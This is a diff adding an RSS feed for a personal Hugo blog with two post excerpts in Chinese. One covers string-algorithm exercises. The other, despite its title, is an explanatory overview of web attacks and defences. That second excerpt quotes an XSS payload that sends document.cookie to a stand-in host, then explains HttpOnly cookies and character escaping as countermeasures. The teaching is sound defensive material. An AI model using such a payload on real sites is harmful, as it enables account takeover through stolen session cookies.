@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Eatingmelons</title>
+    <link>https://eatingmelons.github.io/</link>
+    <description>Recent content on Eatingmelons</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 26 May 2019 10:37:43 +0800</lastBuildDate>
+    
+	<atom:link href="https://eatingmelons.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>关于编译</title>
+      <link>https://eatingmelons.github.io/post/second/</link>
+      <pubDate>Sun, 26 May 2019 10:37:43 +0800</pubDate>
+      
+      <guid>https://eatingmelons.github.io/post/second/</guid>
+      <description>1. 字符串循环移位包含 2. 字符串循环移位 3. 字符串中单词的翻转 4. 两个字符串包含的字符是否完全相同 5. 计算一组字符集合可以组成的回文字符串的最大长度 6. 字符串同构 7. 回文子字符串个数 8. 判断一个整数是否是回文数 9. 统计二进制字符串中连续 1 和连续 0 数量相同的子字符串个数   1. 字符串循环移位包含 编程之美 3.1
+s1 = AABCD, s2 = CDAA Return : true  给定两个字符串 s1 和 s2，要求判定 s2 是否能够被 s1 做循环移位得到的字符串包含。
+s1 进行循环移位的结果是 s1s1 的子字符串，因此只要判断 s2 是否是 s1s1 的子字符串即可。
+2. 字符串循环移位 编程之美 2.17
+s = &amp;quot;abcd123&amp;quot; k = 3 Return &amp;quot;123abcd&amp;quot;  将字符串向右循环移动 k 位。</description>
+    </item>
+    
+    <item>
+      <title>嵌入式博客</title>
+      <link>https://eatingmelons.github.io/post/about/</link>
+      <pubDate>Sun, 26 May 2019 09:55:54 +0800</pubDate>
+      
+      <guid>https://eatingmelons.github.io/post/about/</guid>
+      <description>一、跨站脚本攻击 二、跨站请求伪造 三、SQL 注入攻击 四、拒绝服务攻击 参考资料   一、跨站脚本攻击 概念 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。
+攻击原理 例如有一个论坛网站，攻击者可以在上面发布以下内容：
+&amp;lt;script&amp;gt;location.href=&amp;quot;//domain.com/?c=&amp;quot; + document.cookie&amp;lt;/script&amp;gt;  之后该内容可能会被渲染成以下形式：
+&amp;lt;p&amp;gt;&amp;lt;script&amp;gt;location.href=&amp;quot;//domain.com/?c=&amp;quot; + document.cookie&amp;lt;/script&amp;gt;&amp;lt;/p&amp;gt;  另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
+危害  窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片  防范手段 1. 设置 Cookie 为 HttpOnly 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
+2. 过滤特殊字符 例如将 &amp;lt; 转义为 &amp;amp;lt;，将 &amp;gt; 转义为 &amp;amp;gt;，从而避免 HTML 和 Jascript 代码的运行。</description>
+    </item>
+    
+  </channel>
+</rss>
